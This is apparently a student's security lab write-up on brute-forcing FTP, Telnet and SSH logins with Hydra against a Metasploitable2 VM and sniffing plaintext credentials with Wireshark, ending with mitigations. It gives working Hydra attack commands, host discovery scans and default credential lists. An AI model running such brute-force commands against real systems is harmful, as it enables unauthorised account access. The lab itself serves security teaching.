
# 💻 Labwork 1: Brute Force and Sniffing

## 📚 Table of Contents
1. [🎯 Objectives](#-objectives)  
2. [🧰 Setup](#-setup)  
3. [📍 Target IP Enumeration](#-target-ip-enumeration)  
4. [🥖 Brute Force Attacks](#-2-brute-force-attacks)  
5. [🍖 Sniffing Network Traffic](#-3-sniffing-network-traffic)  
6. [🍕 Problems Encountered](#-4problems-encountered)  
7. [🍥 Mitigation Strategies](#-5mitigation-strategies)  
8. [✅ Summary](#-summary)  

## 🎯 Objectives

- Understand how brute-force attacks work on common network services (FTP, Telnet, SSH).
- Practice using tools like Hydra for password attacks.
- Learn how to use Wireshark to analyze network traffic.
- Identify insecure protocols that transmit data in plaintext.
- Propose secure alternatives and mitigation strategies.

## 🧰 Setup

- **Hydra** – for performing brute force attacks  
- **Wireshark** – for capturing and analyzing network traffic  
- **Kali Linux** – attacker machine  
- **Metasploitable2** – vulnerable target VM  
- **FTP, Telnet, SSH** – services used for login and testing

## ⚠️ Reminder ⚠️
- Before starting, keep in mind that this project requires your own IP, Since all the IP address here are my own



## 📍 Target IP Enumeration

On **Kali Linux**, find the Metasploitable2 IP using:

```bash
netdiscover
```
or:
```bash
nmap -sn 192.168.154.0/24
```

Alternatively, get IP directly from **Metasploitable2**:

```bash
ifconfig
```

## 1. Enumeration of Usernames 🥐

Prepare the username and password lists manually:

```bash
vim usernames.txt
```

Contents:
```
msfadmin
user
admin
root
test
guest
```

```bash
vim passwords.txt
```

Contents:
```
msfadmin
user
admin
root
test
guest
```

## 2. Brute Force Attacks 🥖

### 🔐 FTP Attack

```bash
hydra -L usernames.txt -P passwords.txt ftp://192.168.154.133
```

### 🔐 Telnet Attack

```bash
hydra -l msfadmin -P passwords.txt telnet://192.168.154.133
```

### 🔐 SSH Attack

```bash
hydra -L usernames.txt -P passwords.txt ssh://192.168.154.133
```

> ❌ **Note**: Hydra/SSH client couldn’t connect due to outdated key exchange algorithms on Metasploitable2.

## 3. Sniffing Network Traffic 🍖

### 📡 3.1 Start Wireshark on Kali

- Open Wireshark  
- Select your network interface (e.g., `eth0`, `ens33`)  
- Click "Start Capture"

### 📂 3.2 FTP Login Traffic

Login with:
```bash
ftp 192.168.154.133
```

Then enter:
```
Username: msfadmin  
Password: msfadmin
```

Wireshark filter:
```bash
ftp
```

### 📂 3.3 Telnet Login Traffic

Login with:
```bash
telnet 192.168.154.133
```

Credentials:
```
msfadmin / msfadmin
```

Wireshark filter:
```bash
telnet
```

## 4. Problems Encountered 🍕

| Protocol | Problem                                | Solution                       |
|----------|----------------------------------------|--------------------------------|
| FTP      | None                                   | N/A                            |
| Telnet   | Service was off initially              | Enabled it on Metasploitable2 |
| SSH      | Hydra failed due to key mismatch error | N/A                            |

## 5. Mitigation Strategies 🍥

| Protocol | Vulnerability                  | Secure Alternative | Why it’s Better                          |
|----------|-------------------------------|--------------------|------------------------------------------|
| FTP      | Sends credentials in plaintext | SFTP / FTPS        | Encrypts file transfer + credentials     |
| Telnet   | Plaintext communication        | SSH                | Encrypts entire session                  |
| SSH      | Brute-forceable                | Key-based login    | More secure than password-only logins   |

## ✅ Summary

> 🚨 **Key Takeaways:**
> - FTP and Telnet are insecure protocols — avoid using them.
> - Hydra can easily brute-force weak or default credentials.
> - SSH is secure, but still needs hardening (use keys, limit attempts).
> - Wireshark confirms whether your protocol is leaking info.
> - Always **replace plaintext protocols** with **encrypted ones** like SSH or FTPS.
> - Apply **strong authentication**, **firewalls**, and **monitoring** for better security.
